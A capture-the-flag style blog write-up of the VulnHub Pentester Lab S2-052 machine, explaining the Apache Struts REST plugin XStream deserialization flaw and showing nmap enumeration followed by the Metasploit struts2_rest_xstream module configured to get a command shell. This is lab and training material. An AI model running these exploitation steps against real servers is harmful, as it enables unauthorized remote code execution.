<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack The Vulnhub Pentester Lab: S2-052</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-vulnhub-pentester-lab-s2-052/" rel="bookmark"><time class="entry-date published" datetime="2018-06-25T09:32:36+00:00">June 25, 2018</time><time class="updated" datetime="2025-06-10T20:11:59+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friend!! Today we are going to exploit another VM lab which is designed by Pentester Lab covers the exploitation of the Struts S2-052 vulnerability. The REST Plugin is using an XStreamHandler with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads.</span></p>
<p><span style="color: #000000;">Source: <span style="color: #3366ff;">https://cwiki.apache.org/confluence/display/WW/S2-052</span></span></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<ul>
<li><span style="color: #000000;">Introduction</span></li>
<li><span style="color: #000000;">Download VM</span></li>
<li><span style="color: #000000;">Enumeration (Nmap)</span></li>
<li><span style="color: #000000;">Surfing Port 80</span></li>
<li><span style="color: #000000;">Exploit the target (Metasploit)</span></li>
</ul>
<p><span style="color: #000000;"><strong>Let’s Exploit!!</strong></span></p>
<p><span style="color: #000000;">Download it from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/pentester-lab-s2-052,206/">here</a> </span>and run this VM. Then check its network configuration through <strong>ifconfig </strong>command.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lphmnxYL1Gw/WzC18OYPamI/AAAAAAAAXgo/hqpVUbUQ0MUYugeDdeRwm0NFfsOTI-SCACEwYBhgL/s1600/0.png"/></span></p>
<p><span style="color: #000000;">Since target belongs to 192.168.1.103 network, let’s go for its enumeration with help of nmap following command to identify running service and version.</span></p>
<pre class="lang:default decode:true ">nmap -A 192.168.1.103</pre>
<p><span style="color: #000000;">From nmap scanning result we enumerated the following details:</span></p>
<p><span style="color: #000000;">Http-server-header: <strong>Apache-coyote/1.1</strong></span></p>
<p><span style="color: #000000;">Http-title: <strong>orders</strong></span></p>
<p><span style="color: #000000;">Requested resource: <strong>/order.xhtml</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-m1UlA1hmnwc/WzC18Kco2WI/AAAAAAAAXgs/FLe5zjeVUAkTiUVweE1DrC_4VvdBuXEEQCEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">So when we have explored <strong>/order.xhtml </strong>through the web browser it put up the following webpage.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LmdTM9M-6GU/WzC18Yh-m6I/AAAAAAAAXgw/MfHy9KdLBz4w-BDJUM9lRs5OMGNS3isZgCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Further, we explore user Bob it brings us inside order 3 web page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-hnqYrxSb58g/WzC18o2veZI/AAAAAAAAXhE/KFwo10S_SmMCR2fs6YbSAX1kt2CRTqfkQCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Since the author has already declared that is VM is vulnerable to the Struts S2-052 therefore with the help of the following module of Metasploit we can directly exploit it to obtain command shell of target VM.</span></p>
<pre class="lang:default decode:true ">msf &gt; use exploit/multi/http/struts2_rest_xstream
msf exploit(multi/http/struts2_rest_xstream) &gt; set rhost 192.168.1.103
msf exploit(multi/http/struts2_rest_xstream) &gt; set rport 80
msf exploit(multi/http/struts2_rest_xstream) &gt; set TARGETURI /orders/3
msf exploit(multi/http/struts2_rest_xstream) &gt; exploit</pre>
<p><span style="color: #000000;">BOOOOOOOM!!! Here we owned the command shell of victim’s vm.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vqTbo21FNYw/WzC19M6he3I/AAAAAAAAXhI/S7vEA-gpU-MbTunP55zTwox1Droz1zNHACEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
